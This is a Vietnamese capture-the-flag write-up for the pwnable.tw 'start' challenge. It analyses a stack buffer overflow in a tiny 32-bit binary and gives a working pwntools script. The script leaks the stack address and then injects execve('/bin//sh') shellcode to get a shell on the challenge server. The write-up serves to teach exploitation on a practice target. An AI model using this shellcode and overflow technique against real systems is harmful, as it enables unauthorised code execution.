## [pwnable.tw] - start
# 
**Challenge:**

<img width="450" height="324.5" alt="image" src="https://github.com/user-attachments/assets/07692ac3-a7d1-497a-9635-6ba577b9d3d2" />

**file:**

<img width="1063" height="58" alt="image" src="https://github.com/user-attachments/assets/977e5095-476a-4eca-84ce-3ee617d4ae32" />

**checksec:**

<img width="528" height="201" alt="image" src="https://github.com/user-attachments/assets/2ea5310e-0956-4fe0-b19b-37ab42784457" />

**Chạy thử chương trình:**

<img width="450" height="81" alt="image" src="https://github.com/user-attachments/assets/b20b97e2-bd6d-4991-874d-d028297e3073" />

Có thể thấy, chương trình sau khi khởi động sẽ in ra dòng chữ: "Let's start the CTF:", chờ user nhập 1 dòng kí tự rồi tự kết thúc. 

**Decompiler (IDA):**

<img width="495" height="552" alt="image" src="https://github.com/user-attachments/assets/a903fade-33c1-4d83-93cd-acca233f23b5" />

**Phân tích và tìm cách giải:**

Khi đọc kĩ vào decompile, ta có thể thấy được cách hoạt động của chương trình:
- Đẩy giá trị esp vào stack (push esp)
- Đẩy địa chỉ hàm thoát vào stack để kết thúc chương trình khi gọi return (push offset _exit)
- Reset lại giá trị của các register eax, ebx, ecx, edx về 0 (các lệnh xor)
- Lần lượt đẩy dòng chữ "Let's start the CTF:" vào stack. (5 lần push ngay dưới)
- Phát ngắt đầu tiên (int 80h), gọi hàm write (eax = 4) để in vào stdout (ebx = 1) 20 kí tự (edx = 0x14) tại địa chỉ esp (ecx = esp), mục đích là in dòng ‘Let’s start the CTF:’ ra màn hình
- Phát ngắt thứ hai, gọi hàm read (eax = 3) để đọc tối đa 60 kí tự (edx = 0x3c) từ stdin (ebx = 0) (tức từ bàn phím), lưu vào stack tại vị trí esp (ecx = esp).
- Tăng giá trị esp lên 20 (để esp chỉ lại vào hàm exit) và return

Vì không gian dự kiến để chứa dữ liệu nhập là 14h = 20 bytes nhưng lại cho phép nhập đến 3Ch = 60 bytes => Dùng được lỗi Buffer Overflow (vì canary cũng đã bị disable rồi)

*Tìm được BOF rồi, giờ sao nữa?*  
Ý tưởng là chèn shellcode vào input để ghi đè vào stack, sau đó điều khiển return address trỏ về shellcode. Tuy nhiên, lại có hai vấn đề mới nảy ra:

1. Shellcode đâu ra? Well... tìm trên internet? Lưu ý rằng nó phải đủ ngắn để có thể vừa 60 kí tự input. Sau một hồi lục lọi, mình đã tìm được một shellcode vừa đủ nhỏ để đưa vào chương trình:  
  `shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'`  
  *(anh huhu ơi chỉ em cách dùng thẳng asm cho vào payload thay vì phải rã nó ra thành hex như này với T.T)*

2. Làm sao biết được địa chỉ shellcode mà ta đã chèn vào stack, để điều khiển return address trỏ về đúng shellcode kia?

Quan sát kỹ sẽ thấy, ngay đầu chương trình có lệnh "push esp" đẩy giá trị esp vào stack. Nếu ta điều khiển return address để chương trình return về 0x08048087 bằng cách gửi `payload1 = ‘a’ * 20 + ‘\x87\x80\x04\x08’ (0x08048087 theo little endian)`, chương trình sau khi return về sẽ gọi hàm write() thêm lần nữa, in ra 20 bytes trên stack. Vì 4 bytes đầu tiên trên stack lúc này chính là esp nên coi như ta đã leak được địa chỉ esp. Chương trình sẽ tiếp tục gọi thêm hàm read() nữa, ta sẽ gửi payload thứ hai: `payload2 = ‘b’ * 20 + (esp+20) + shellcode`, lúc này chương trình sẽ return về đúng shellcode mà ta cần.

Một ví dụ nhỏ về trạng thái của stack trước và sau truyền các payload:  
<img width="1396" height="312" alt="image" src="https://github.com/user-attachments/assets/3c8738b5-68fd-48a9-bac1-36817eff21ed" />

**Code:**
``` python
from pwn import *

# có thể dùng p = process('./start') cũng được
p = remote('chall.pwnable.tw', 10000)
context.arch = 'i386'

shellcode = (b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')

p.recvuntil('CTF:')
payload1 = b'a'*20 + p32(0x08048087)
p.send(payload1)

saved_esp = u32(p.recv()[:4])
payload2 = b'b'*20 + p32(saved_esp+20) + shellcode
p.send(payload2)

p.interactive()   
```

**Kết quả: **

<img width="1408" height="862" alt="image" src="https://github.com/user-attachments/assets/7c4fe449-b369-4c76-9896-84661f148d94" />

Flag cần tìm được ghi tại /home/start/flag.txt
